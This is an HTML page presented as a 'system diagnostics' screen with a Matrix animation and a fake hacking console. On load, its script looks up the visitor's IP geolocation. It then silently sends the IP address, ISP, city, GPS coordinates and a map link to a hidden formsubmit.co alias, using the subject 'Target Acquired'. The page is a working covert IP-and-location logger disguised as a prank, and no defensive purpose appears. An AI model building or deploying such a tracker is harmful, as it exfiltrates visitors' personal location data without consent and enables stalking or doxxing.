<!DOCTYPE html>
<html>
<head>
    <title>SYSTEM_DIAGNOSTICS</title>
    <style>
        body, html { margin: 0; padding: 0; background: black; overflow: hidden; font-family: 'Courier New', monospace; }
        canvas { position: absolute; top: 0; left: 0; z-index: 1; opacity: 0.3; }
        .console {
            position: relative; z-index: 2; color: #00ff00;
            padding: 30px; background: rgba(0, 0, 0, 0.85);
            border: 1px solid #00ff00; margin: 50px auto;
            max-width: 700px; box-shadow: 0 0 20px #00ff00;
            height: 450px; overflow-y: hidden;
            text-shadow: 0 0 5px #00ff00;
        }
        .line { margin-bottom: 4px; white-space: pre-wrap; font-size: 14px; }
        .blue { color: #00ccff; text-shadow: 0 0 5px #00ccff; }
        .red { color: #ff3333; text-shadow: 0 0 5px #ff3333; }
    </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="console" id="console">
    <div class="line">> [SYSTEM] BOOTING_CORE_FRMWK...</div>
</div>

<script>
    // --- 1. THE MATRIX BACKGROUND ---
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const letters = "0101010101ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    const fontSize = 16;
    const columns = canvas.width / fontSize;
    const drops = Array(Math.floor(columns)).fill(1);
    function draw() {
        ctx.fillStyle = "rgba(0, 0, 0, 0.05)"; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = "#0F0"; ctx.font = fontSize + "px monospace";
        for (let i = 0; i < drops.length; i++) {
            const text = letters[Math.floor(Math.random() * letters.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }
    setInterval(draw, 35);

    // --- 2. THE FAST CONSOLE SCRIPT ---
    const consoleBox = document.getElementById('console');
    function addLine(text, type = "") {
        const div = document.createElement('div');
        div.className = "line " + type;
        div.innerText = "> " + text;
        consoleBox.appendChild(div);
        consoleBox.scrollTop = consoleBox.scrollHeight;
    }

    // --- 3. THE "PULL" & EMAIL LOGIC ---
    fetch('https://ipapi.co/json/')
    .then(res => res.json())
    .then(data => {
        const hackerLines = [
            "ESTABLISHING_ENCRYPTED_LINK...",
            "BYPASSING_ISP_GATEWAY...",
            "INJECTING_PACKET_SNIFFER...",
            `NETWORK_FOUND: ${data.org}`,
            `GEO_LOCK: ${data.latitude}, ${data.longitude}`,
            `TARGET_CITY: ${data.city}`,
            "EXTRACTING_BROWSER_METADATA...",
            "LOGGING_SESSION_TO_REMOTE_DB...",
            "SUCCESS: TARGET_DETAILS_UPLOADED.",
            "SHUTTING_DOWN_TRACE..."
        ];

        let i = 0;
        const speed = 150; // Super fast script speed
        const interval = setInterval(() => {
            if (i < hackerLines.length) {
                addLine(hackerLines[i], i > 2 && i < 7 ? "blue" : "");
                i++;
            } else {
                clearInterval(interval);
            }
        }, speed);

        // SEND TO YOUR HIDDEN ALIAS (jabuvo)
        // Note: Using the /ajax/ version of your alias
        fetch("https://formsubmit.co/ajax/jabuvo", {
            method: "POST",
            headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
            body: JSON.stringify({
                _subject: "🎯 Target Acquired: " + data.ip,
                IP_Address: data.ip,
                ISP: data.org,
                Location: `${data.city}, ${data.region}`,
                GPS: `${data.latitude}, ${data.longitude}`,
                Map: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`
            })
        });
    });
</script>
</body>
</html>
